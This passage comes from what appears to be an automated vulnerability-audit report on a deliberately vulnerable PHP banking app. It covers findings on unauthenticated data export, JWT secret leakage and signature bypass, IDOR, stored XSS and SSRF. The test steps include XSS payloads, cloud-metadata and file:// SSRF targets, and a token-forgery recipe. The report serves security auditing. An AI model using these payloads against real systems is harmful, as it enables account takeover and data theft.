  "impact": "Complete unauthenticated data breach of the entire customer database (PII, password_hash, totp_secret, avatar_url, addresses, accounts, transactions).",
  "severity_reasoning": "High: duplicate of the unauthenticated bulk export finding; maximal impact, zero access requirement.",
  "dynamic_test": "curl -s https://target/api/admin/export/users with no auth; confirm full dump of users/accounts/transactions returned."
}
```

#### Validator reasoning

The route `/api/admin/export/users` is registered in AdminRouter.php with `'auth' => false`, mapped to `AdminUserController::exportAll()`. The dispatch loop in AdminRouter::dispatch() only invokes `AdminAuthMiddleware::handle()` when `$route['auth']` is truthy; for this route it is explicitly false, so the middleware is skipped entirely and `$auth` remains null, and no auth argument is passed to the handler. `exportAll()` itself takes zero parameters and performs no authentication/authorization check of its own — it directly issues `SELECT * FROM users`, `SELECT * FROM accounts`, and `SELECT * FROM transactions ORDER BY created_at DESC` against AdminDatabase and returns all rows via `Response::success()`. The front controller (public/index.php) routes any request whose path starts with `/api/admin/` to `AdminRouter::dispatch()` with no upstream authentication, IP allow-listing, or other gate — only CORS handling and a generic exception handler. Comparing to the JWT-based `AdminAuthMiddleware`, which is the only auth mechanism available in this router, no other route in AdminRouter.php shares this bypass; all other admin routes set `'auth' => true`. This is a genuine, unauthenticated, unauthenticated-reachable full customer database (including password_hash, totp_secret, address fields), account, and transaction dump — a full source-to-sink path confirmed with no effective control in place.

#### Code evidence

```
// Data export (for internal tooling)
$r->addRoute('GET', '/api/admin/export/users', ['handler' => [AdminUserController::class, 'exportAll'], 'auth' => false]);

public static function exportAll(): void
{
    $db = AdminDatabase::getInstance();
    $stmt = $db->query('SELECT * FROM users');
    $users = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM accounts');
    $accounts = $stmt->fetchAll();
    $stmt = $db->query('SELECT * FROM transactions ORDER BY created_at DESC');
    $transactions = $stmt->fetchAll();
    Response::success(['users' => $users, 'accounts' => $accounts, 'transactions' => $transactions]);
}
```

## 44. Unauthenticated /api/health endpoint leaks JWT signing secret and DB credentials

- Lead reference: PWNJ-044
- Category: A05
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:22
- Fingerprint: 5c4e70679e7d1a17d13eec83e30dedade613c8847d3ec13b65b6135e1af827e7

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:22
```

#### Controls encountered

```
[
  "None: route explicitly sets 'auth' => false, and dispatch() only calls AuthMiddleware/MachineAuthMiddleware when 'auth' is true or 'machine', so this route bypasses all auth checks by design."
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "The actual contents of config/app.php were not directly inspected, but the code unconditionally accesses $config['jwt_secret'] and returns it, and AuthService's use of the same config key for JWT signing is asserted in the description; this is a very high confidence but not 100% file-level confirmed link between this secret and AuthService's signing key without reading AuthService.php directly."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false)",
    "Router::health()",
    "jwt_secret, db_host, db_name, db_user in response",
    "Forged JWT signed with leaked secret accepted by AuthMiddleware",
    "Account takeover of arbitrary user"
  ],
  "impact": "Unauthenticated JWT secret and DB credential leak enabling full token forgery / account takeover.",
  "severity_reasoning": "High: duplicate critical health-endpoint secret leak.",
  "dynamic_test": "curl -s https://target/api/health unauthenticated; confirm jwt_secret/db_* fields in response; forge JWT and confirm AuthMiddleware acceptance."
}
```

#### Validator reasoning

The Router.php source confirms the finding precisely as described. The `/api/health` route is registered with `'auth' => false`, meaning in the dispatch() switch statement, `$requiresAuth === true` is false and `$requiresAuth === 'machine'` is false, so `$auth` remains null and neither AuthMiddleware::handle() nor MachineAuthMiddleware::handle() is invoked before call_user_func_array($handler, $args) executes Router::health(). The health() handler loads the live application config via `require __DIR__ . '/../config/app.php'` and returns db_host, db_name, db_user, and critically `jwt_secret` directly in the JSON response body via Response::success(). There is no authentication check, no environment gating (e.g., no check for APP_ENV === 'development' before exposing secrets — environment is only included informationally in the output, not used as a condition), and no redaction of sensitive fields. Any unauthenticated network client can issue GET /api/health and receive the raw JWT signing secret in the response. Since AuthService (not shown but referenced) presumably validates JWTs using this same secret from config/app.php, possession of the secret allows forging arbitrary valid JWTs for any user id, fully bypassing AuthMiddleware-protected endpoints — a complete authentication bypass. This is a textbook A05 Security Misconfiguration / sensitive data exposure with critical downstream impact (full auth bypass), and the source-to-sink path (config file read -> JSON response body -> unauthenticated HTTP endpoint) is fully visible in the provided file with no intervening control.

#### Code evidence

```
public static function health(): void
{
    $config = require __DIR__ . '/../config/app.php';
    Response::success([
        'status'      => 'ok',
        'php_version' => PHP_VERSION,
        'server'      => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'db_host'     => $config['db_host'],
        'db_name'     => $config['db_name'],
        'db_user'     => $config['db_user'],
        'jwt_secret'  => $config['jwt_secret'],
        'environment' => getenv('APP_ENV') ?: 'production',
    ]);
}
...
$r->addRoute('GET', '/api/health', ['handler' => [self::class, 'health'], 'auth' => false]);
```

## 45. IDOR: any authenticated user can view any other user's transaction by id

- Lead reference: PWNJ-045
- Category: A01
- Severity: MEDIUM
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/TransactionController.php:show
- Fingerprint: 88b594955e476f0ea8039f454de371afb85c348e950183a81ddc9c113df2d813

### Evidence Chain

#### Source

```
BankOfEd-main/src/Controllers/TransactionController.php:show
```

#### Controls encountered

```
[
  "Route requires a valid Bearer JWT (authentication only, verified in Router.php + AuthMiddleware.php)",
  "AuthMiddleware checks token revocation and user existence, but performs no resource-level authorization"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Not verified whether an API gateway/WAF sits in front of this app in production to rate-limit ID enumeration, but this would not prevent single-victim targeted exploitation and is not part of the application code under review"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user",
    "GET /api/transactions/{id}",
    "TransactionController::show() - $auth accepted but unused for authorization",
    "Transaction::findById() returns any transaction regardless of owner",
    "Cross-customer transaction data disclosed"
  ],
  "impact": "System-wide disclosure of any customer's transaction details via sequential ID enumeration.",
  "severity_reasoning": "Medium: confidentiality-only impact via IDOR enumeration, no funds movement.",
  "dynamic_test": "As authenticated user, GET /api/transactions/{id} for ids outside own accounts; confirm details returned regardless of ownership."
}
```

#### Validator reasoning

The route GET /api/transactions/{id:\d+} is registered with 'auth' => true (Router.php:80), meaning AuthMiddleware only validates that the caller presents a valid, non-revoked JWT for an existing user — it performs no per-resource authorization, only authentication. TransactionController::show($auth, $vars) receives this authenticated user context in $auth but never reads it; it calls Transaction::findById((int)$vars['id']), which executes 'SELECT * FROM transactions WHERE id = ?' with no join/filter on the account owner or user id. The returned row is passed unfiltered to Transaction::format() and returned via Response::success(), exposing from_account_id, to_bsb, to_account_number, amount, description, receipt_number, etc. Contrast with the sibling index() method in the same controller and with AccountController/AddressBookController, which correctly use *::findByIdAndUser($id, $userId) to enforce ownership — confirming that findByIdAndUser is the established pattern in this codebase and that show() is missing the equivalent check. No other middleware, model-level scoping, or authorization decorator exists between the route and the DB query. This is a straightforward, exploitable IDOR: any authenticated user can enumerate integer transaction IDs via GET /api/transactions/{id} to read any other customer's transaction record.

#### Code evidence

```
public static function show(array $auth, array $vars): void
{
    $txn = Transaction::findById((int)$vars['id']);

    if (!$txn) {
        Response::notFound('Transaction not found.');
    }

    Response::success(Transaction::format($txn));
}
```

## 46. Stored DOM XSS via account_name breaking out of onclick attribute in admin Accounts page

- Lead reference: PWNJ-046
- Category: A03
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/accounts.js:50
- Fingerprint: ce703f77aa7b32d6adcc9d5658becd4e8a6a59f07f5e4b2cdc200374b9e57de6

### Evidence Chain

#### Source

```
BankOfEd-main/public/admin/js/pages/accounts.js:50
```

#### Controls encountered

No controls recorded

#### Sink

Not recorded

#### Counterevidence

```
[
  "Exploitation requires the admin to click the specific row's 'Edit Balance' button (not a zero-click/on-load payload) — this is an interaction requirement, not a code-level mitigation, but does raise the practical exploitation bar slightly from a pure stored/DOM XSS that fires on page load"
]
```

#### Proof gaps

```
[
  "No dynamic/browser-based confirmation was performed in this review; the exploitation mechanics rely on well-established HTML parsing behavior (attribute entity decoding occurs before inline event-handler JS compilation) rather than an executed PoC",
  "Did not exhaustively verify absence of CSP across all deployment configurations (e.g., web server or reverse-proxy-level headers) beyond the reviewed application source"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated customer sets account_name with quote-breakout payload (validated only string|max:100)",
    "POST /api/accounts persists account_name verbatim",
    "Admin opens Accounts page: GET /api/admin/accounts",
    "accounts.js renderTable() builds onclick attribute via escapeHtml().replace() (dead-code fix), assigned via container.innerHTML",
    "Browser decodes &#39; to ' before executing onclick JS",
    "Injected script executes in admin session, admin token stolen from localStorage"
  ],
  "impact": "Stored XSS in the admin Accounts page executing arbitrary script in the admin's session, leading to admin token theft and full admin panel compromise.",
  "severity_reasoning": "High: low-privilege customer action leads to full admin session compromise via stored XSS.",
  "dynamic_test": "As authenticated customer, POST /api/accounts with account_name = \"x');alert(document.cookie);//\"; have admin view the Accounts page and confirm the injected JS executes via the onclick attribute HTML-entity decoding."
}
```

#### Validator reasoning

Verified end-to-end. (1) Source: AccountController::store only validates account_name as 'required|string|max:100' (AccountController.php:28) — no character/HTML/quote restrictions — and persists it verbatim via Account::create (Account.php:73-80). Any authenticated customer can set this value via POST /api/accounts. (2) Propagation: AdminAccountController::index (AdminAccountController.php:22-31) selects a.account_name raw from the DB with no server-side encoding and returns it as JSON to the admin SPA. (3) Sink: accounts.js renderTable() builds the Edit-Balance button as onclick="...showEditBalanceModal(<id>, '<escaped-name>', '<balance>')" using U.escapeHtml(a.account_name).replace(/'/g,"\\'"), then assigns the full markup via container.innerHTML = html (line 54). I confirmed U.escapeHtml (utils.js escMap) converts a literal ' into the entity &#39; before the .replace(/'/g,...) runs, so by the time replace executes there are no literal apostrophes left to backslash-escape — the replace is a functional no-op, exactly as described. Because the payload sits inside a double-quoted HTML attribute, the only character that matters for breaking the HTML attribute boundary is '\"' (which IS escaped to &quot; by escapeHtml and thus safe), but the browser's HTML parser still decodes &#39; back to a literal apostrophe inside the attribute value before that decoded text is compiled as the inline event-handler's JS source. This is standard HTML/JS inline-handler behavior: attribute value entities are decoded during HTML parsing, and the decoded string is what becomes the function body, independent of the JS string-literal encoding intent. A stored account_name like `x');alert(document.cookie);//` therefore produces onclick markup that, after entity decoding, parses as `showEditBalanceModal(5, 'x');alert(document.cookie);//', '100')` — i.e., arbitrary JS executes when the admin clicks the Edit Balance button on that row, a routine admin action while triaging the Accounts page. No CSP, template auto-escaping, or additional output filtering was found in the reviewed admin JS/PHP that would block this. The root cause (HTML-escaping applied for a JS-string-literal context, with the JS-escaping regex running after the entity substitution) is confirmed exactly as claimed, and the require chain (self-signup -> create account with malicious name -> admin views list -> admin clicks the row's Edit Balance button) is realistic and low-friction.</reasoning>
<parameter name="controls">["Server-side validation is only required|string|max:100 (no HTML/character sanitization) — confirmed ineffective as a control", "U.escapeHtml HTML-encodes &,<,>,\",' — effective against basic HTML/attribute breakout (e.g., closing the outer double-quoted attribute) but does not prevent the JS-context breakout being exploited here since the entity is decoded before JS compilation", "No CSP restricting inline event handlers was found in the reviewed admin panel files (not exhaustively verified across all templates/headers)"]

## 47. Stored DOM XSS via first_name/last_name breaking out of onclick attribute in admin Customer detail page

- Lead reference: PWNJ-047
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/customers.js:161
- Fingerprint: e3b33139795689e9dc94f200aba07cbb8f1df4bfa909646519f2e46042136bcc

### Evidence Chain

#### Source

```
BankOfEd-main/public/admin/js/pages/customers.js:161
```

#### Controls encountered

```
[
  "Client-side escapeHtml() call — but it HTML-entity-encodes before the JS-quote-escaping regex is applied, rendering the regex a no-op and the escaping context-mismatched (HTML-safe encoding used for a JS-string-in-attribute context)",
  "Server-side validation is only required|string|max:100 — no character allowlist/denylist for names",
  "No CSP header present in the application to restrict inline event handlers"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "The exploit requires the admin to click/trigger the onclick handler or the browser's attribute-value decoding behavior for the entity to matter; if a defender's model only considers execution occurring strictly at click time and disputes exactly when numeric char-ref decoding vs. JS compilation occurs, there is a very narrow theoretical nuance, but standard HTML parsing decodes attribute value entities during tokenization regardless of when the script inside the attribute is later executed, so this does not defeat the exploit path."
]
```

#### Proof gaps

```
[
  "Not independently verified via live browser/DOM execution (static review only), though the HTML entity decoding behavior for attribute values is standard, well-documented browser behavior",
  "Did not exhaustively confirm absence of any global CSP set via HTTP response headers at the web server / hosting layer outside the repository (e.g. reverse proxy config), only confirmed no CSP is set in app code (index.php/.htaccess/controllers)"
]
```

#### Attack path

```
{
  "nodes": [
    "Unauthenticated attacker registers via POST /api/auth/register with malicious first_name/last_name",
    "Admin opens customer detail: GET /api/admin/customers/{id}",
    "customers.js renderDetail() builds onclick with escapeHtml().replace() dead-code pattern",
    "U.$('customer-detail-content').innerHTML = html assigns markup",
    "Browser decodes &#39; to ' before executing onclick JS -> script runs in admin session",
    "Attacker steals admin JWT from localStorage, performs arbitrary admin actions"
  ],
  "impact": "Unauthenticated attacker plants stored XSS via registration fields that executes in the admin's browser upon viewing customer details, enabling admin session/token theft and full admin panel takeover.",
  "severity_reasoning": "High: fully unauthenticated attacker achieves admin-session compromise via a self-registration field, critical privilege escalation.",
  "dynamic_test": "Register with first_name=\"x'); alert(document.cookie); //\" via POST /api/auth/register; open the customer's detail page as admin and confirm script execution."
}
```

#### Validator reasoning

The end-to-end path is fully verified in source:

1. POST /api/auth/register (AuthController::register) validates first_name/last_name only with 'required|string|max:100' (AuthController.php lines 19-20) — no character/quote restriction — and stores the raw values via User::create.
2. Admin's GET /api/admin/customers/{id} (AdminUserController::show) selects '*' from users and returns first_name/last_name verbatim in the JSON response, with no output encoding.
3. Client-side customers.js renderDetail() builds the Delete button as:
   onclick="BankOfEdAdmin.CustomersPage.confirmDelete(' + c.id + ', \'' + U.escapeHtml(c.first_name + ' ' + c.last_name).replace(/'/g, "\\'") + '\')"
   U.escapeHtml (utils.js escMap) converts a literal `'` into the HTML entity `&#39;` BEFORE the subsequent `.replace(/'/g, "\\'")` runs, so the replace never matches anything (no literal `'` remains) — it is dead/no-op code.
4. The resulting HTML (containing `&#39;` inside the double-quoted onclick attribute) is inserted via `U.$('customer-detail-content').innerHTML = html`. When the browser's HTML parser tokenizes this markup, it decodes numeric character references (including `&#39;`) inside attribute values as part of standard HTML parsing — this happens before the onclick handler is later compiled/executed as JS on click. This decoding restores the literal `'`, allowing an attacker-supplied name such as `x'); alert(document.cookie); //` to break out of the single-quoted JS string argument and inject arbitrary JS that executes in the admin session when the Delete button is clicked (or, depending on browser parsing nuance, when the attribute is otherwise processed).
5. No CSP header was found anywhere in the codebase (grep for Content-Security-Policy returned nothing), so no CSP mitigation blocks inline event handlers.

This is a genuinely exploitable stored/DOM XSS: an unauthenticated attacker can self-register with a crafted name and achieve script execution in an authenticated admin's browser context, enabling session/token theft and full admin panel takeover. The escaping bug (HTML-entity-encode then attempt to escape a JS quote that's already gone) is a real, verifiable logic flaw, and the reachability (self-registration → admin view) requires no special privilege.

## 48. SSRF via unrestricted avatar URL fetch (file_get_contents) triggered from client importAvatar

- Lead reference: PWNJ-048
- Category: A10
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:80
- Fingerprint: 22b1843c7ee57222af17654807815425d3dc1ef476f6793da59730019c164519

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/public/banking/js/pages/profile.js",
  "line": 158,
  "symbol": "url = $('#avatar-url').val()",
  "input": "user-supplied avatar URL"
}
```

#### Controls encountered

```
[
  "Requires an authenticated session (auth=>true) — reduces exposure to unauthenticated attackers but any registered/logged-in user (a low bar in most banking demo apps) can trigger it",
  "empty() check on $data['url'] only rejects blank input; no other validation"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 80,
  "symbol": "file_get_contents($data['url'], false, $context)",
  "operation": "server-side outbound HTTP/file fetch of attacker-controlled URL"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Runtime PHP configuration (allow_url_fopen, wrapper availability such as file://) was not independently confirmed from source, though file_get_contents with a URL argument requires allow_url_fopen=On by default in most PHP deployments serving HTTP apps like this one",
  "Production network egress/firewall rules that might restrict outbound requests to internal ranges are an infrastructure control outside the scope of source review and were not verified"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated user enters URL in profile avatar-import field",
    "public/banking/js/api.js importAvatar(url) -> POST /profile/avatar",
    "ProfileController::avatarProxy() file_get_contents($data['url']) with redirect-follow, no allow-list",
    "Server issues request to internal/cloud-metadata target or reads local file via file://",
    "Fetched bytes returned base64-encoded to caller via avatar_data"
  ],
  "impact": "Authenticated user can trigger SSRF/local-file-read via the normal avatar-import UI flow, obtaining internal service responses or local files echoed back through the API.",
  "severity_reasoning": "High: confirmed end-to-end client-triggered SSRF with data exfiltration back to attacker.",
  "dynamic_test": "Use the profile page's avatar-import UI (importAvatar) to submit an internal/cloud-metadata URL; confirm the request goes through POST /profile/avatar and observe the fetched content returned to the client (base64), confirming SSRF is triggerable through the traced client path."
}
```

#### Validator reasoning

Full source-to-sink path verified directly in code. Router.php:51 registers POST /api/profile/avatar -> ProfileController::avatarProxy with auth=true (any authenticated user, not admin-restricted). avatarProxy reads $data['url'] from the JSON body with only an empty() check — no scheme allow-list (http/https only), no host/IP allow-list, no blocking of private/link-local ranges, and no rejection of the file:// or other dangerous wrappers. The value is passed directly to file_get_contents($data['url'], false, $context) with follow_location=>true, meaning redirects are also followed, defeating any naive post-hoc filtering. The fetched bytes are base64-encoded and returned to the client along with the raw source_url, giving the attacker a full response-reflecting oracle that turns this into a versatile SSRF read-primitive (e.g., http://169.254.169.254/latest/meta-data/, internal admin panels, or file:///etc/passwd if allow_url_fopen wrapper table permits). Client-side call chain (profile.js importAvatar -> api.js importAvatar -> POST /profile/avatar) matches the description, though it's not strictly necessary for exploitability since any authenticated HTTP client can hit the JSON API directly. This is a textbook, concretely reachable SSRF with no compensating server-side control in the code shown.

#### Code evidence

```
// api.js
function importAvatar(url)  { return request('POST', '/profile/avatar', { url: url }); }
// request() -> fetch(BASE + path, opts)  (api.js:50)

// ProfileController.php
$content = @file_get_contents($data['url'], false, $context);
...
$encoded = base64_encode($content);
Response::success(['avatar_data' => "data:{$mime};base64,{$encoded}", 'size' => strlen($content), 'source_url' => $data['url']]);
```

## 49. Stored self-XSS via unescaped Content-Type header reflected into avatar data-URI rendered with innerHTML

- Lead reference: PWNJ-049
- Category: A03
- Severity: MEDIUM
- Confidence: 82%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/app.js:72
- Fingerprint: 2498bcfc3667c153317b8d8d0e0f2d032e3bd5a16ebd3aa57b861555798b3e33

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 92,
  "symbol": "$mime = trim(substr($header, 13))",
  "input": "attacker-controlled HTTP response header from user-supplied URL"
}
```

#### Controls encountered

```
[
  "escapeHtml() utility exists and is used elsewhere in the codebase for similar rendering paths, but is not applied at the two cited sinks (profile.js:139, app.js:72), so it is not an effective control here.",
  "No Content-Security-Policy or other response header restricting inline script/injected markup was found anywhere in the repository."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/app.js",
  "line": 72,
  "symbol": "avatarEl.innerHTML = '<img src=\"' + user.avatar_data + '\" ...>'",
  "operation": "unsanitized HTML injection via innerHTML"
}
```

#### Counterevidence

```
[
  "Impact is scoped primarily to the importing user's own authenticated session (self-XSS) since there is no evidence of another principal viewing another user's avatar_data in the reviewed code, slightly limiting real-world severity versus a classic stored-XSS-affecting-others scenario, consistent with the report's own 'medium' severity and self-XSS framing."
]
```

#### Proof gaps

```
[
  "No live/dynamic browser execution was performed to confirm the exact byte sequence needed to escape the src=\" attribute survives PHP's json_encode + JS JSON.parse round trip verbatim in all edge cases (e.g., PHP's default json_encode escaping of forward slashes with \\/ does not block quotes/angle brackets, but a live PoC was not executed).",
  "No confirmation that any other higher-layer middleware (e.g., a WAF, reverse proxy header sanitizer) exists outside the reviewed source tree that could intercept or strip the crafted header before reaching the application; only the application-level code was reviewed."
]
```

#### Attack path

```
{
  "nodes": [
    "User imports avatar from attacker-controlled URL (SSRF entry point)",
    "ProfileController::avatarProxy() parses Content-Type header unsanitized into $mime",
    "Server builds avatar_data = \"data:{$mime};base64,{$encoded}\" and returns to client",
    "profile.js/app.js insert avatar_data into DOM via innerHTML ('<img src=\"'+data+'\">')",
    "Crafted Content-Type breaks out of src attribute, injecting script",
    "Script executes in authenticated SPA context, can read localStorage JWT"
  ],
  "impact": "Attacker-controlled Content-Type header from a self-hosted server injects into a data-URI rendered via innerHTML, executing script in the authenticated banking SPA context, enabling JWT theft from localStorage.",
  "severity_reasoning": "Medium: primarily self-XSS trigger but exploitable persistently via cached avatar_data on every sidebar render, with real token-theft potential.",
  "dynamic_test": "Host a server that returns Content-Type: image/png\"><script>alert(document.cookie)</script> in response to a request; import that URL as avatar via profile page; confirm the crafted header breaks out of the img src attribute and executes script when profile.js/app.js render avatar_data via innerHTML."
}
```

#### Validator reasoning

The full source-to-sink chain is verified in code with no mitigating control at any hop:

1. Source: ProfileController::avatarProxy (src/Controllers/ProfileController.php) accepts an arbitrary attacker-supplied `url` in the POST /profile/avatar body, fetches it via file_get_contents with a stream context, and then parses the raw `$http_response_header` array. The Content-Type line is extracted with `trim(substr($header, 13))` with zero validation, character filtering, or allow-listing of MIME types.
2. This unsanitized value is interpolated directly into `"data:{$mime};base64,{$encoded}"` and returned via Response::success(), which merely does `json_encode` (no HTML-escaping, no JSON_HEX_TAG/JSON_HEX_QUOT flags) and sets no Content-Security-Policy header anywhere in the codebase (verified: no CSP/nonce header setting found in the whole tree).
3. Client-side, api.js's `request()` calls `res.json()`, which faithfully restores any literal `"`, `<`, `>` characters that were present in the original header string (JSON encoding round-trips these characters transparently).
4. profile.js:139 (`renderAvatar`) injects `data.avatar_data` directly into `$('#avatar-preview').html(...)` (jQuery .html() == innerHTML) with no escaping — confirmed via read_file.
5. The same value is cached onto `currentProfile.avatar_data`, persisted via `Api.setUser()` into `localStorage.bankofed_user` (confirmed in api.js), and re-rendered unescaped on every subsequent page load via app.js:72 `avatarEl.innerHTML = '<img src="' + user.avatar_data + '" ...>'` — confirmed via read_file at the exact cited line.
6. The codebase demonstrably has an `escapeHtml` utility (banking/js/utils.js and admin/js/utils.js) that is used pervasively elsewhere for exactly this purpose, but it is conspicuously NOT applied to avatar_data at either injection site, confirming the omission is a real gap rather than a false positive from some wrapper/sanitizer being missed.

Exploitation requires the attacker to host a server they control that responds to the fetch with a crafted Content-Type header such as `image/png"><script>...</script>`, which is a low-bar, fully attacker-controlled precondition (this exact SSRF-adjacent capability is the basis of the merged/provenance candidate 836). Once triggered, the payload persists in localStorage and re-executes on every app load rendering the sidebar, in the authenticated SPA origin — satisfying the "stored" characterization used in the title even though the trigger is self-directed (self-XSS unless there's an admin/shared-view feature, which the report appropriately caveats).

#### Code evidence

```
// ProfileController.php
if (isset($http_response_header)) {
  foreach ($http_response_header as $header) {
    if (stripos($header, 'content-type:') === 0) {
      $mime = trim(substr($header, 13));   // attacker-controlled, unsanitized
      break;
    }
  }
}
Response::success(['avatar_data' => "data:{$mime};base64,{$encoded}", ...]);

// app.js:72
avatarEl.innerHTML = '<img src="' + user.avatar_data + '" alt="avatar" class="w-full h-full object-cover">';
```

## 50. JWT signature verification bypass in customer AuthMiddleware (token forgery / auth bypass)

- Lead reference: PWNJ-050
- Category: A07
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:47 (decodeToken), used by BankOfEd-main/src/Middleware/AuthMiddleware.php:20
- Fingerprint: 06ca85e23a78a19ef66b0e74c11825104ed5173cbb2a16fdab4cc54cdffa9761

### Evidence Chain

#### Source

```
BankOfEd-main/src/Services/AuthService.php:47 (decodeToken), used by BankOfEd-main/src/Middleware/AuthMiddleware.php:20
```

#### Controls encountered

```
[
  "Expiration (exp) check is present but insufficient without signature verification since exp is attacker-controlled in the forged token",
  "Revoked-token (jti) blacklist check exists but only blocks specifically revoked jti values; attacker can pick any unused jti",
  "User::findById($payload->sub) requires the target user id to exist in DB, which is trivially satisfiable (e.g., sub=1)"
]
```

#### Sink

Not recorded

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not execute a live exploit against a running instance to observe the HTTP response for a forged token, relying on static code-path confirmation instead",
  "Did not verify User model / findById behavior for edge cases (e.g., sub being non-numeric) but this does not affect the core bypass for a valid sub value"
]
```

#### Attack path

```
{
  "nodes": [
    "External attacker (no credentials)",
    "Forge JWT with arbitrary sub, garbage signature",
    "public/banking/js/api.js attaches Bearer token blindly",
    "AuthMiddleware::handle() -> AuthService::decodeToken() checks only exp, not signature",
    "User::findById($payload->sub) returns victim; full impersonation granted"
  ],
  "impact": "Complete customer-facing authentication bypass allowing impersonation of any user across profile, accounts, transfers, transactions, address book.",
  "severity_reasoning": "High: duplicate of the core JWT-signature-bypass root cause with full account-takeover impact.",
  "dynamic_test": "Craft JWT base64(header).base64({\"sub\":1,\"jti\":\"x\",\"exp\":9999999999}).garbage and send as Bearer token to GET /api/profile or POST /api/transfers/own; confirm acceptance without valid signature, proving full auth bypass."
}
```

#### Validator reasoning

Confirmed by direct source inspection. AuthService::decodeToken() (src/Services/AuthService.php:47-64) splits the raw bearer token into its three dot-separated parts, base64-decodes only the middle (payload) segment, and validates solely the `exp` claim. It never calls Firebase\JWT\JWT::decode(), never constructs a Key from config['jwt_secret'], and the third segment (the HMAC signature) is read only to satisfy the `count($parts) === 3` check — its content is never verified. This is invoked unconditionally by AuthMiddleware::handle() (src/Middleware/AuthMiddleware.php:20-22), whose only other checks are a jti-revocation lookup and User::findById($payload->sub) — neither of which requires knowledge of any secret, since both `jti` and `sub` are attacker-controlled fields inside the (unsigned-as-verified) payload the attacker constructs. Router.php shows AuthMiddleware::handle() is used for every 'auth' => true route: /api/profile, /api/accounts*, /api/address-book*, /api/transfers/*, /api/fx/*, /api/transactions*, /api/insurance/sso*. Contrast with AdminAuthMiddleware.php:27, which correctly calls JWT::decode($token, new Key($config['jwt_secret'], $config['jwt_algorithm'])) — proving the correct verification pattern exists elsewhere in the codebase and was simply not applied to the customer path. An attacker with no knowledge of jwt_secret can therefore forge base64(header).base64('{"sub":1,"jti":"x","exp":9999999999}').anything and be treated as user 1 (or any arbitrary user id) across the entire customer banking API, achieving full account takeover (profile access/update, transfers, address book, transaction history). No compensating control (e.g., WAF rule, additional signature check, mTLS, session store cross-check) is present in the reviewed code. This is a textbook A07 broken authentication / auth bypass via missing cryptographic verification.

## 51. JWT signing secret and DB credentials disclosed via public /api/health endpoint

- Lead reference: PWNJ-051
- Category: A02
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Router.php:24-33 (health), route registered with auth=false
- Fingerprint: 2495911dc293bbf3fd8c67629184df84109c09c6978940efa7dc8d8e18001ff5

### Evidence Chain

#### Source

```
BankOfEd-main/src/Router.php:24-33 (health), route registered with auth=false
```

#### Controls encountered

```
[
  "None identified: route explicitly sets auth=false and no middleware executes for that route type",
  "No output filtering/redaction present in Response::success or Router::health"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No counterevidence found: implementation matches the exact code snippet cited in the finding, and the dispatch logic confirms no auth check is applied for 'auth' => false routes"
]
```

#### Proof gaps

```
[
  "No confirmation that this endpoint is actually deployed to a reachable production network path (e.g., behind reverse proxy that might strip it), but nothing in the codebase implements such a restriction, so this is not a material gap for the code-level finding.",
  "No live/dynamic verification (HTTP request) was performed in this session; verdict relies on static code path analysis only."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated client",
    "GET /api/health (auth=false)",
    "Router::health() returns jwt_secret, db_host, db_name, db_user",
    "Attacker mints signed JWT for arbitrary sub",
    "Protected endpoints accept forged token -> account takeover"
  ],
  "impact": "Unauthenticated disclosure of the JWT signing secret used by AuthService::createToken, enabling forged tokens for any user id plus DB topology disclosure.",
  "severity_reasoning": "High: duplicate critical unauthenticated secret disclosure with account-takeover impact.",
  "dynamic_test": "curl -s https://target/api/health unauthenticated; confirm jwt_secret and db_* returned; sign a JWT with the leaked secret and use it against a protected endpoint."
}
```

#### Validator reasoning

The candidate is fully substantiated by direct source inspection. In Router.php, the route `/api/health` is registered with `'auth' => false` (line ~93). In Router::dispatch(), the auth-dispatch switch only invokes AuthMiddleware::handle() when `$requiresAuth === true` and MachineAuthMiddleware::handle() when `$requiresAuth === 'machine'`; for `false` neither middleware runs and `$auth` stays null, so `Router::health()` executes with zero authentication or authorization checks for any caller. The handler loads `config/app.php` (confirmed content read) and returns, via `Response::success()` (which unconditionally JSON-encodes the given array and writes it to the HTTP response body), the fields `db_host`, `db_name`, `db_user`, and `jwt_secret` verbatim with no redaction/masking logic anywhere in the call path. `config['jwt_secret']` is populated from `getenv('JWT_SECRET') ?: 'bankofed-dev-secret-change-in-production'` in app.php, and grep confirms this exact same config key/value is consumed by `AuthService::createToken` (AuthService.php:47) to sign customer JWTs via `JWT::encode($payload, $config['jwt_secret'], $config['jwt_algorithm'])`. Thus an unauthenticated caller can retrieve the HS256 signing secret and forge valid customer tokens for arbitrary user 